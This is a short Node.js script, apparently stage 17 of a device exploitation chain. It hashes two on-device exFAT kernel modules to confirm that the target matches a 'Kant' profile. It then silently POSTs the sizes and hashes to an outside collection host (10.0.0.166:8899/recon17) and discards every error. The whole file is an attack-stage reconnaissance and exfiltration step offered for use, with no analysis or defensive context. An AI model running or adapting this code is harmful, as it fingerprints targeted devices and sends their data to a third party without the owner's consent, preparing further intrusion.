// Stage-17: hash on-device exFAT modules to confirm Kant profile match.
var fs = require('fs');
var http = require('http');
var crypto = require('crypto');
function post(o) {
  var b = JSON.stringify(o);
  var req = http.request({ host: '10.0.0.166', port: 8899, path: '/recon17', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(b) } }, function (r) { });
  req.on('error', function (e) { });
  req.write(b); req.end();
}
var out = {};
['exfat_core.ko', 'exfat_fs.ko'].forEach(function (n) {
  try {
    var b = fs.readFileSync('/lib/modules/4.1.10/kernel/' + n);
    out[n] = { size: b.length, sha256: crypto.createHash('sha256').update(b).digest('hex') };
  } catch (e) { out[n] = 'ERR ' + e.message; }
});
post(out);
